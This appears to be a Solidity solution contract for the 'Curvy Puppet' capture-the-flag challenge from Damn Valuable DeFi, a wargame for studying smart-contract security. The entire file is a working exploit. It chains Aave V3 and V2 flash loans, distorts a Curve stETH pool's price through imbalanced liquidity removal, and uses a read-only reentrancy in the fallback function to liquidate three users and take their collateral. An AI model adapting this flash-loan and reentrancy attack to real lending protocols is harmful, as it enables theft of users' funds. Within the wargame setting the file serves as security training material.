// SPDX-License-Identifier: MIT
pragma solidity =0.8.25;
import {WETH} from "solmate/tokens/WETH.sol";
import {DamnValuableToken} from "../../src/DamnValuableToken.sol";
import {CurvyPuppetLending, IERC20} from "../../src/curvy-puppet/CurvyPuppetLending.sol";
import {IStableSwap} from "../../src/curvy-puppet/IStableSwap.sol";
import {IPermit2} from "permit2/interfaces/IPermit2.sol";
import {console} from "forge-std/Test.sol";
import {IFlashLoanSimpleReceiver} from "lib/aave-v3-core/contracts/flashloan/interfaces/IFlashLoanSimpleReceiver.sol";

struct V2ReserveData {
    //stores the reserve configuration
    ReserveConfigurationMap configuration;
    //the liquidity index. Expressed in ray
    uint128 liquidityIndex;
    //variable borrow index. Expressed in ray
    uint128 variableBorrowIndex;
    //the current supply rate. Expressed in ray
    uint128 currentLiquidityRate;
    //the current variable borrow rate. Expressed in ray
    uint128 currentVariableBorrowRate;
    //the current stable borrow rate. Expressed in ray
    uint128 currentStableBorrowRate;
    uint40 lastUpdateTimestamp;
    //tokens addresses
    address aTokenAddress;
    address stableDebtTokenAddress;
    address variableDebtTokenAddress;
    //address of the interest rate strategy
    address interestRateStrategyAddress;
    //the id of the reserve. Represents the position in the list of the active reserves
    uint8 id;
  }

struct ReserveConfigurationMap {
    uint256 data;
}

struct V3ReserveData {
    //stores the reserve configuration
    ReserveConfigurationMap configuration;
    //the liquidity index. Expressed in ray
    uint128 liquidityIndex;
    //the current supply rate. Expressed in ray
    uint128 currentLiquidityRate;
    //variable borrow index. Expressed in ray
    uint128 variableBorrowIndex;
    //the current variable borrow rate. Expressed in ray
    uint128 currentVariableBorrowRate;
    //the current stable borrow rate. Expressed in ray
    uint128 currentStableBorrowRate;
    //timestamp of last update
    uint40 lastUpdateTimestamp;
    //the id of the reserve. Represents the position in the list of the active reserves
    uint16 id;
    //aToken address
    address aTokenAddress;
    //stableDebtToken address
    address stableDebtTokenAddress;
    //variableDebtToken address
    address variableDebtTokenAddress;
    //address of the interest rate strategy
    address interestRateStrategyAddress;
    //the current treasury balance, scaled
    uint128 accruedToTreasury;
    //the outstanding unbacked aTokens minted through the bridging feature
    uint128 unbacked;
    //the outstanding debt borrowed against this asset in isolation mode
    uint128 isolationModeTotalDebt;
}

interface V2Pool {
    function flashLoan(
    address receiverAddress,
    address[] calldata assets,
    uint256[] calldata amounts,
    uint256[] calldata modes,
    address onBehalfOf,
    bytes calldata params,
    uint16 referralCode
  ) external;

  function getReserveData(address asset) external view returns (V2ReserveData memory);
}

interface V3Pool {
    function getReserveData(address asset) external view returns (V3ReserveData memory);

    function flashLoanSimple(
    address receiverAddress,
    address asset,
    uint256 amount,
    bytes calldata params,
    uint16 referralCode
  ) external;
}

contract Attacker {

    IERC20 lp_token;
    IStableSwap curvePool;
    CurvyPuppetLending lending;
    V2Pool v2Pool;
    V3Pool v3Pool;
    WETH weth;
    uint256 constant TREASURY_WETH_BALANCE = 200e18;
    IERC20 stETH;
    uint256 v2WETHTotal;
    uint256 v3WETHTotal;
    address[3] users;
    address permit2;
    address dvt;
    address treasury;
    bool attacked;

    constructor(address _v2Pool, address _v3Pool, IERC20 _lp_token, IStableSwap _curvePool, CurvyPuppetLending _lending, WETH _weth, IERC20 _stETH, address[3] memory _users, address _permit2, address _dvt, address _treasury) payable {
        lp_token = _lp_token;
        curvePool = _curvePool;
        lending = _lending;
        v2Pool = V2Pool(_v2Pool);
        v3Pool = V3Pool(_v3Pool);
        weth = _weth;
        stETH = _stETH;
        permit2 = _permit2;
        dvt = _dvt;
        treasury = _treasury;

        V2ReserveData memory data2 = v2Pool.getReserveData(address(weth));
        V3ReserveData memory data3 = v3Pool.getReserveData(address(weth));
        
        v2WETHTotal = weth.balanceOf(data2.aTokenAddress);
        v3WETHTotal = weth.balanceOf(data3.aTokenAddress);

        for (uint256 i = 0; i < 3; i++) {
            users[i] = _users[i];
        }

        IERC20(lp_token).approve(permit2, type(uint256).max);
        IPermit2(permit2).approve({token:address(lp_token), 
                                   spender:address(lending),
                                   amount:3e18,
                                   expiration:uint48(block.timestamp)});
    }

    function attack() external {
        v3Pool.flashLoanSimple(address(this), address(weth), v3WETHTotal, "", 0);
    }

    // second call

    function executeOperation(address[] calldata, uint256[] calldata amounts,
                              uint256[] calldata premiums, address, bytes calldata) external returns (bool) {
        
        
        require(amounts.length == 1, "asset length not 1");
        require(premiums.length == 1, "asset length not 1");
        uint256 borrowedAmount = v2WETHTotal + v3WETHTotal;
        weth.withdraw(borrowedAmount);
        uint256 lpAdded = curvePool.add_liquidity{value:borrowedAmount}([borrowedAmount, 0], 0);
        curvePool.remove_liquidity_imbalance([uint256(1e20), uint256(3554e19)], lpAdded);
        console.log(lending.getBorrowValue(1));
        curvePool.remove_liquidity_one_coin(lp_token.balanceOf(address(this)) - 3e18, 0, 0);
        weth.deposit{value:address(this).balance}();
        weth.approve(msg.sender, amounts[0] + premiums[0]);

        return true;
    }

    // first call

    function executeOperation(address asset, uint256 amount, uint256 premium, address, bytes calldata) external returns (bool) {
        address[] memory assets = new address[](1);
        uint256[] memory amounts = new uint256[](1);
        assets[0] = asset;
        amounts[0] = v2WETHTotal;
        uint256[] memory modes = new uint256[](1);
        modes[0] = 0;

        v2Pool.flashLoan(address(this), assets, amounts, modes, address(0), "", 0);

        uint256 totalOwed = amount + premium;
        weth.approve(msg.sender, totalOwed);

        return true;
    }

    // receive() external payable {
        
        
    // }

    fallback() external payable {
        if ((msg.sender != address(weth)) && (!attacked)) {
            console.log(lending.getCollateralValue(2500e18) * 100);
            console.log(lending.getBorrowValue(1e18) * 175);
            
            for (uint256 i = 0; i < 3; i++) {
                lending.liquidate(users[i]);
            }
            uint256 collateral = IERC20(dvt).balanceOf(address(this));
            IERC20(dvt).transfer(treasury, collateral);
            attacked = true;
        }   
    }
}

